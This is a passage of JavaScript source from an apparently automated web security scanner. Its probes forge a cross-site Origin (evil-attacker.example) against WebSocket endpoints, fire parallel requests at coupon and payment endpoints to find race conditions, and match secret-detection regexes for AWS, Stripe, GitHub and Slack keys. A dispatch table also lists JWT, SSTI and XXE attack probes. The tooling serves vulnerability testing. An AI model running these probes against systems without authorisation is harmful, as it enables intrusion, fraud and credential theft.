    sock.on('secureConnect', writeReq);
    sock.on('error', e => {
      clearTimeout(timer);
      finish({ ok: false, error: String(e.message || e) });
    });
    let buf = Buffer.alloc(0);
    let headerDone = false;
    let statusLine = '';
    let postBytes = 0;
    sock.on('data', chunk => {
      buf = Buffer.concat([buf, chunk]);
      if (!headerDone) {
        const idx = buf.indexOf('\r\n\r\n');
        if (idx < 0) return;
        headerDone = true;
        statusLine = buf.slice(0, buf.indexOf('\r\n')).toString('latin1');
        const m = /^HTTP\/\d(?:\.\d)?\s+(\d{3})/i.exec(statusLine);
        const status = m ? Number(m[1]) : null;
        if (status !== 101) {
          clearTimeout(timer);
          return finish({ ok: true, status, upgraded: false });
        }
        postBytes = buf.length - (idx + 4);
        // Stay open briefly: unsolicited server frames = pre-auth data push.
        setTimeout(() => {
          clearTimeout(timer);
          finish({ ok: true, status: 101, upgraded: true, serverPushedBytes: postBytes });
        }, 2500);
      } else {
        postBytes += chunk.length;
      }
    });
  });
}

export async function websocketProbe({
  baseUrl,
  paths = null,
  authToken = null,
  authHeader = 'authorization',
  webProbe: recon = null,
  timeoutMs = DEFAULT_TIMEOUT_MS,
} = {}) {
  const started = Date.now();
  const origin = baseUrl.replace(/\/$/, '');
  const checks = [];
  const findings = [];

  const candidates = [];
  if (paths) candidates.push(...paths);
  if (recon) {
    for (const ep of recon.endpoints || []) {
      if (/\/ws\b|websocket|socket|cable|realtime|\/ws\//i.test(ep)) candidates.push(ep);
    }
  }
  candidates.push(...WS_PATHS);

  const wsBase = origin.replace(/^http/, 'ws');
  let tested = 0;
  for (const p of [...new Set(candidates)].slice(0, 6)) {
    const wsUrl = `${wsBase}${p.startsWith('/') ? p : '/' + p}`;

    // (a) No Origin header at all.
    const noOrigin = await wsHandshake(wsUrl, { timeoutMs: Math.min(timeoutMs, 10000) });
    checks.push({
      path: p,
      test: 'no-origin',
      status: noOrigin.status ?? null,
      upgraded: !!noOrigin.upgraded,
      error: noOrigin.error || null,
    });
    if (noOrigin.upgraded) {
      findings.push({
        type: 'websocket-no-origin-check',
        title: `WebSocket ${p} upgrades with NO Origin header — origin validation missing`,
        severity: 'medium',
        url: wsUrl,
        evidence: {
          request: `GET ${p} Upgrade: websocket (no Origin header) → 101 Switching Protocols`,
          serverPushedBytes: noOrigin.serverPushedBytes || 0,
          note: 'Any website can open this socket from a victim browser (CSWSH) because the server never validates Origin.',
        },
        confidence: 0.9,
        source: 'websocket_probe',
      });
    }

    // (b) Forged cross-site Origin.
    const evil = await wsHandshake(wsUrl, {
      origin: 'https://evil-attacker.example',
      timeoutMs: Math.min(timeoutMs, 10000),
    });
    checks.push({
      path: p,
      test: 'evil-origin',
      status: evil.status ?? null,
      upgraded: !!evil.upgraded,
      error: evil.error || null,
    });
    if (evil.upgraded) {
      findings.push({
        type: 'websocket-cswsh',
        title: `WebSocket ${p} accepts cross-site Origin https://evil-attacker.example (CSWSH)`,
        severity: 'high',
        url: wsUrl,
        evidence: {
          request: `GET ${p} Upgrade: websocket, Origin: https://evil-attacker.example → 101 Switching Protocols`,
          serverPushedBytes: evil.serverPushedBytes || 0,
          note: 'Cross-Site WebSocket Hijacking: a malicious page can open an authenticated socket as the victim.',
        },
        confidence: 0.92,
        source: 'websocket_probe',
      });
    }

    // (c) Authentication — only testable when the caller supplies credentials.
    if (authToken) {
      const authed = await wsHandshake(wsUrl, {
        extraHeaders: { [authHeader]: `Bearer ${authToken}` },
        timeoutMs: Math.min(timeoutMs, 10000),
      });
      const anonHs = await wsHandshake(wsUrl, { origin, timeoutMs: Math.min(timeoutMs, 10000) });
      checks.push({
        path: p,
        test: 'auth',
        authedUpgraded: !!authed.upgraded,
        anonUpgraded: !!anonHs.upgraded,
      });
      if (!authed.error && authed.upgraded && !anonHs.upgraded) {
        // properly gated — no finding, honest negative recorded
      } else if (anonHs.upgraded) {
        findings.push({
          type: 'websocket-no-auth',
          title: `WebSocket ${p} upgrades WITHOUT authentication credentials`,
          severity: 'high',
          url: wsUrl,
          evidence: {
            request: `GET ${p} Upgrade: websocket (no ${authHeader} header) → 101 Switching Protocols`,
            serverPushedBytes: anonHs.serverPushedBytes || 0,
            note: 'The socket is reachable with no credentials at all — any client can connect.',
          },
          confidence: 0.92,
          source: 'websocket_probe',
        });
      }
    } else {
      checks.push({
        path: p,
        test: 'auth',
        skipped: 'no authToken supplied — cannot distinguish public vs broken auth',
      });
    }

    tested++;
    if (findings.some(f => f.url === wsUrl)) break; // one vulnerable endpoint is enough signal
  }

  return {
    tool: 'websocket_probe',
    baseUrl,
    endpointsTested: tested,
    checks,
    findings,
    durationMs: Date.now() - started,
  };
}

// ── Tool: race_condition_probe ───────────────────────────────────────────
// Fires N parallel state-changing requests and checks the OUTCOME against a
// caller-supplied expectation ({ maxSuccess, maxTotalDelta } + stateCheck).
// A finding needs the limit to be observably exceeded — never just "N
// requests were sent".

export async function raceProbe({
  baseUrl,
  endpoint = null,
  method = 'POST',
  body = null,
  headers = {},
  parallel = 10,
  expectation = null,
  stateCheck = null,
  webProbe: recon = null,
  timeoutMs = DEFAULT_TIMEOUT_MS,
} = {}) {
  const started = Date.now();
  const origin = baseUrl.replace(/\/$/, '');
  const checks = [];
  const findings = [];

  const candidates = [];
  if (endpoint) candidates.push(endpoint);
  if (recon) {
    for (const ep of recon.endpoints || []) {
      if (
        /coupon|discount|voucher|promo|transfer|redeem|apply|purchase|order|payment|withdraw/i.test(
          ep
        )
      )
        candidates.push(ep);
    }
  }
  candidates.push('/api/coupon/apply', '/api/coupons/apply', '/coupon/apply');

  const readState = async () => {
    if (!stateCheck?.path) return null;
    const url = `${origin}${stateCheck.path}`;
    const r = await fetchTimed(url, {}, timeoutMs).catch(e => ({ error: e.message }));
    if (r.error) return { error: r.error };
    const j = tryJson(r.body);
    const val = j && stateCheck.field ? j[stateCheck.field] : null;
    return { value: typeof val === 'number' ? val : null, raw: String(r.body || '').slice(0, 200) };
  };

  for (const ep of [...new Set(candidates)].slice(0, 3)) {
    const url = `${origin}${ep.startsWith('/') ? ep : '/' + ep}`;
    const reqBody = body ?? { code: 'WELCOME10', _dm_race: probeMarker('race') };
    const opts = {
      method: method.toUpperCase(),
      headers: { 'content-type': 'application/json', ...headers },
      ...(method.toUpperCase() === 'GET' ? {} : { body: JSON.stringify(reqBody) }),
    };

    const stateBefore = await readState();
    const base = await fetchTimed(url, opts, timeoutMs).catch(e => ({ error: e.message }));
    if (base.error || [404, 405, 501].includes(base.status) || base.status >= 500) {
      checks.push({ endpoint: ep, skipped: `baseline ${base.status ?? base.error}` });
      continue;
    }

    const t0 = Date.now();
    const settled = await Promise.allSettled(
      Array.from({ length: parallel }, () => fetchTimed(url, opts, timeoutMs))
    );
    const windowMs = Date.now() - t0;
    const results = settled.map(r =>
      r.status === 'fulfilled'
        ? { status: r.value.status, ms: r.value.durationMs }
        : { error: String(r.reason?.message || r.reason) }
    );
    const okCount = results.filter(r => r.status >= 200 && r.status < 300).length;
    const stateAfter = await readState();

    const check = { endpoint: ep, parallel, windowMs, okCount, baselineStatus: base.status };
    if (
      stateBefore &&
      stateAfter &&
      typeof stateBefore.value === 'number' &&
      typeof stateAfter.value === 'number'
    ) {
      check.stateBefore = stateBefore.value;
      check.stateAfter = stateAfter.value;
      check.stateDelta = stateAfter.value - stateBefore.value;
    }
    checks.push(check);

    const maxSuccess = expectation?.maxSuccess;
    const maxTotalDelta = expectation?.maxTotalDelta;
    const violatedSuccess = maxSuccess != null && okCount > maxSuccess;
    const violatedDelta =
      maxTotalDelta != null &&
      check.stateDelta != null &&
      Math.abs(check.stateDelta) > Math.abs(maxTotalDelta);

    if (violatedSuccess || violatedDelta) {
      const statusHist = {};
      for (const r of results) {
        const k = r.status ?? `err:${r.error}`;
        statusHist[k] = (statusHist[k] || 0) + 1;
      }
      findings.push({
        type: 'race-condition',
        title: `Race condition at ${method.toUpperCase()} ${ep}: ${okCount}/${parallel} parallel requests succeeded (limit: ${maxSuccess ?? 'n/a'})`,
        severity: 'high',
        url,
        evidence: {
          request: `${method.toUpperCase()} ${ep} × ${parallel} in parallel (${windowMs}ms window)`,
          successCount: okCount,
          expectedMax: maxSuccess ?? null,
          statusHistogram: statusHist,
          stateBefore: check.stateBefore ?? null,
          stateAfter: check.stateAfter ?? null,
          stateDelta: check.stateDelta ?? null,
          expectedMaxDelta: maxTotalDelta ?? null,
          note: 'Parallel execution exceeded the stated single-flight limit — missing lock/serialization on a state-changing action (double-spend, coupon reuse, overdraft).',
        },
        confidence: 0.88,
        source: 'race_condition_probe',
      });
      break;
    }
    // Honest negative: limit respected.
    check.verdict = `no race: ${okCount}/${parallel} succeeded within limit ${maxSuccess ?? '(no limit given)'}`;
  }

  return {
    tool: 'race_condition_probe',
    baseUrl,
    checks,
    findings,
    durationMs: Date.now() - started,
  };
}

// ── Tool: secrets_in_js_probe ────────────────────────────────────────────
// Fetches same-origin JS bundles served by the target and scans for
// high-confidence secret patterns. Generic key=value hits additionally need
// high Shannon entropy and must not look like placeholders. Evidence is
// redacted — the finding proves a secret EXISTS, it never exfiltrates it.

const SECRET_PATTERNS = [
  { name: 'aws-access-key', regex: /\bAKIA[0-9A-Z]{16}\b/, confidence: 0.97 },
  {
    name: 'aws-secret-key',
    regex: /aws[_-]?secret[_-]?access[_-]?key["']?\s*[:=]\s*["']([A-Za-z0-9/+=]{40})["']/i,
    confidence: 0.95,
  },
  { name: 'stripe-live-key', regex: /\bsk_live_[A-Za-z0-9]{16,}\b/, confidence: 0.97 },
  { name: 'stripe-test-key', regex: /\bsk_test_[A-Za-z0-9]{16,}\b/, confidence: 0.9 },
  {
    name: 'github-token',
    regex: /\b(ghp_[A-Za-z0-9]{36}|gho_[A-Za-z0-9]{36}|github_pat_[A-Za-z0-9_]{22,})\b/,
    confidence: 0.97,
  },
  { name: 'slack-token', regex: /\bxox[baprs]-[A-Za-z0-9-]{10,}\b/, confidence: 0.95 },
  { name: 'google-api-key', regex: /\bAIza[0-9A-Za-z\-_]{35}\b/, confidence: 0.95 },
  {
    name: 'private-key-block',
    regex: /-----BEGIN (?:RSA |EC |OPENSSH )?PRIVATE KEY-----/,
    confidence: 0.97,
  },
  {
    name: 'generic-secret',
    regex:
      /(?:api[_-]?key|apikey|secret|token|password|passwd|private[_-]?key|client[_-]?secret)\s*[:=]\s*["']([^"'`\s]{12,128})["']/i,
    confidence: 0.8,
    generic: true,
  },
];

const PLACEHOLDER_RE =
  /test|example|dummy|changeme|xxxx|12345|placeholder|your[_-]?key|insert|sample|fake/i;

function shannonEntropy(s) {
  const freq = {};
  for (const c of s) freq[c] = (freq[c] || 0) + 1;
  let h = 0;
  for (const c of Object.keys(freq)) {
    const p = freq[c] / s.length;
    h -= p * Math.log2(p);
  }
  return h;
}

function redactSecret(v) {
  const s = String(v);
  if (s.length <= 10) return s.slice(0, 4) + '…[REDACTED]';
  return s.slice(0, 6) + '…' + s.slice(-4) + ' [REDACTED]';
}

export async function secretsProbe({
  baseUrl,
  maxFiles = 10,
  maxBytes = 2_000_000,
  timeoutMs = DEFAULT_TIMEOUT_MS,
} = {}) {
  const started = Date.now();
  const origin = baseUrl.replace(/\/$/, '');
  const checks = [];
  const findings = [];
  const seenSecret = new Set();

  const home = await fetchTimed(baseUrl, {}, timeoutMs).catch(e => ({ error: e.message }));
  if (home.error || typeof home.body !== 'string') {
    return {
      tool: 'secrets_in_js_probe',
      baseUrl,
      checks,
      findings,
      error: home.error || 'no body',
      durationMs: Date.now() - started,
    };
  }

  // Same-origin <script src> URLs.
  const jsUrls = [];
  const baseHost = (() => {
    try {
      return new URL(baseUrl).origin;
    } catch {
      return null;
    }
  })();
  for (const m of home.body.matchAll(/<script\b[^>]*\bsrc\s*=\s*["']([^"'#]+)["']/gi)) {
    try {
      const u = new URL(m[1], baseUrl);
      if (u.origin === baseHost) jsUrls.push(u.toString());
    } catch {
      /* skip */
    }
  }
  // Inline scripts are scanned too.
  const inlineScripts = [
    ...home.body.matchAll(/<script\b(?![^>]*\bsrc=)[^>]*>([\s\S]*?)<\/script\s*>/gi),
  ]
    .map(m => m[1])
    .filter(s => s && s.trim());

  const scanSource = (source, fileUrl) => {
    const lines = source.split('\n');
    for (const pat of SECRET_PATTERNS) {
      const re = new RegExp(
        pat.regex.source,
        pat.regex.flags.includes('g') ? pat.regex.flags : pat.regex.flags + 'g'
      );
      for (const m of source.matchAll(re)) {
        const raw = pat.generic ? m[1] || m[0] : m[0];
        if (!raw || PLACEHOLDER_RE.test(raw)) continue;
        if (pat.generic && (shannonEntropy(raw) < 3.4 || raw.length < 16)) continue;
        const key = `${pat.name}:${raw.slice(0, 12)}`;
        if (seenSecret.has(key)) continue;
        seenSecret.add(key);
        const idx = m.index ?? 0;
        const lineNo = source.slice(0, idx).split('\n').length;
        const lineText = (lines[lineNo - 1] || '').trim().slice(0, 200);
        findings.push({
          type: 'exposed-secret',
          title: `Hardcoded ${pat.name} in client-side bundle ${safePath(fileUrl)}`,
          severity: 'high',
          url: fileUrl,
          evidence: {
            pattern: pat.name,
            file: fileUrl,
            line: lineNo,
            redactedValue: redactSecret(raw),
            context: lineText.replace(raw, '[REDACTED]'),
            note: 'A high-confidence secret is shipped to every visitor inside the JS bundle — rotate it and move it server-side.',
          },
          confidence: pat.confidence,
          source: 'secrets_in_js_probe',
        });
      }
    }
  };

  for (const [i, src] of inlineScripts.entries())
    scanSource(src, `${origin}/#inline-script-${i + 1}`);
  checks.push({ test: 'inline-scripts', scanned: inlineScripts.length });

  let fetched = 0;
  for (const jsUrl of [...new Set(jsUrls)].slice(0, maxFiles)) {
    const res = await fetchTimed(jsUrl, {}, timeoutMs).catch(e => ({ error: e.message }));
    if (res.error || typeof res.body !== 'string' || !res.body.length) {
      checks.push({ file: safePath(jsUrl), error: res.error || 'empty' });
      continue;
    }
    const source = res.body.length > maxBytes ? res.body.slice(0, maxBytes) : res.body;
    const before = findings.length;
    scanSource(source, jsUrl);
    fetched++;
    checks.push({
      file: safePath(jsUrl),
      bytes: source.length,
      secretsFound: findings.length - before,
    });
  }
  checks.push({ test: 'js-files', fetched });

  return {
    tool: 'secrets_in_js_probe',
    baseUrl,
    checks,
    findings,
    durationMs: Date.now() - started,
  };
}

/** Dispatch table used by ToolExecutor.executeBuiltIn (merged with HTTP_PROBES). */
export const ADV_PROBES = Object.freeze({
  jwt_attack_probe: jwtProbe,
  ssti_probe: sstiProbe,
  xxe_probe: xxeProbe,
  graphql_probe: graphqlProbe,
  websocket_probe: websocketProbe,
  race_condition_probe: raceProbe,
  secrets_in_js_probe: secretsProbe,
});
